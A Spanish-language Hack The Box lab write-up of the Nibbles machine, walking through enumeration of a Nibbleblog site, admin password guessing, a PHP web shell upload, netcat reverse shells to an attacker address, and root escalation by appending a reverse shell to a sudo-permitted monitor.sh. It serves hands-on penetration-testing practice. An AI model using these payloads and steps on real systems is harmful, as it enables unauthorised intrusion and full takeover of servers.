# HTB - Explotación de Nibbleblog


---

## Fase I: Enumeración y acceso

### 0. Nota: Asegúrese de estar ejecutando sudo openvpn ARCHIVO_DE_VPN_DESCARGADO y usar IP tur0 de la VPN

### 1. Escaneo de puertos con Nmap

```bash
nmap -sV --open -oA Upload_php_initial_scan -n -Pn -sS -v 10.129.168.126
```

```bash
nmap -p22,80 -Pn -n -sS -v -sC -oA port_scan 10.129.168.126
```

### 2. Verificación de la web con cURL

```bash
curl http://10.129.168.126:80
```

Salida:

```html
<b>Hello world!</b>
<!-- /nibbleblog/ directory...! -->  
```

[### Encontramos directorio interesante ###]

### 3. Identificación de tecnologías con WhatWeb

```bash
whatweb http://10.129.168.126:80/nibbleblog
```

### 4. Extracción de configuraciones con cURL

```bash
curl http://10.129.168.126/nibbleblog/content/private/config.xml | xmllint --format -
```

Salida:

```xml
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
```

### 5. Enumeración de directorios con Gobuster

```bash
gobuster dir -u http://10.129.168.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30
```

```bash
gobuster dir -u http://10.129.168.126/nibbleblog/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

Resultados relevantes:

```
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [--> http://10.129.168.126/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [--> http://10.129.168.126/nibbleblog/content/]
```

### 6. Lectura del README

```bash
curl http://10.129.168.126/nibbleblog/README
```

Salida:

```
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

### 7. Prueba de credenciales

```plaintext
Usuario: admin
Contraseña: nibb...  (vemos que se repite dos veces en el encaezado, por lo que deducimos que se puede probar)
```

Accedemos con éxito a la administración de Nibbleblog.

### 8. Subida de una Web Shell

**Creamos un archivo PHP malicioso:**

```bash
nvim shell.php
```

Contenido:

```php
<?php system('id'); ?>
```

Subimos el archivo a la administración de Nibbleblog y verificamos ejecución:

```bash
curl http://10.129.168.126/nibbleblog/content/private/plugins/my_image/image.php
```

Salida:

```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

### 9. Obtención de Shell Reversa

**Creamos un archivo PHP con una Reverse Shell:**

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1234 >/tmp/f"); ?>
```

**Abrimos un listener en el atacante (AT):**

```bash
nc -lvnp 1234
```

**Ejecutamos la shell remota:**

```bash
curl http://10.129.168.126/nibbleblog/content/private/plugins/my_image/image.php
```

Obtenemos una shell interactiva:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 10. Extracción de archivos comprimidos

```bash
gzip -d personal.zip
```

### 11. Obtención de la flag de usuario

```bash
cat /home/nibbler/flag.txt
```

Salida:

```
79c03865431abf47b90ef24......
```

## Fase II: Escalada de privilegios

### Opción 1: Uso de `LinEnum`

#### 1. Transferir y ejecutar `LinEnum.sh`
En la máquina atacante:
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python3 -m http.server 1234
```
En la máquina víctima:
```bash
wget http://10.10.10.X:1234/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
Analizamos la salida y encontramos permisos sobre `monitor.sh`.

#### 2. Manipulación del script `monitor.sh`
Insertamos código de shell reversa:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 >/tmp/f' | tee -a monitor.sh
```

#### 3. Escuchar conexión en la máquina atacante
```bash
nc -lvnp 1235
```

#### 4. Ejecutar el script con privilegios
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```
Obtendremos acceso como `root`. Buscamos la flag:
```bash
cat /root/flag_root.txt
```
Flag:
```
de5e5d6619862a8aa5b9b2.......
```
### Opción 2: Abuso de permisos `sudo`

#### 1. Verificar permisos con `sudo -l`
```bash
sudo -l
```
Salida esperada:
```
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

#### 2. Insertar código de shell reversa en `monitor.sh`
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 >/tmp/f' | tee -a monitor.sh
```

#### 3. Escuchar conexión en la máquina atacante
```bash
nc -lvnp 1235
```

#### 4. Ejecutar el script como `root`
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```
Obtendremos acceso como `root`. Buscamos la flag:
```bash
cat /root/flag_root.txt
```
Flag:
```
de5e5d6619862a8aa5b9b21......
```
---

### Notas finales

Este ejercicio de HTB nos ha permitido practicar:

- Enumeración de servicios y directorios.
- Explotación de un panel de administración vulnerable.
- Carga de una Web Shell para ejecución remota de comandos.
- Obtención de una Reverse Shell interactiva.
- Escalada de privilegios a root mediante un script con permisos de sudo.
- Esta explicación es una simplificación de la más extendida, y maravillosa, que se encuentra en: https://academy.hackthebox.com/module/details/77

---


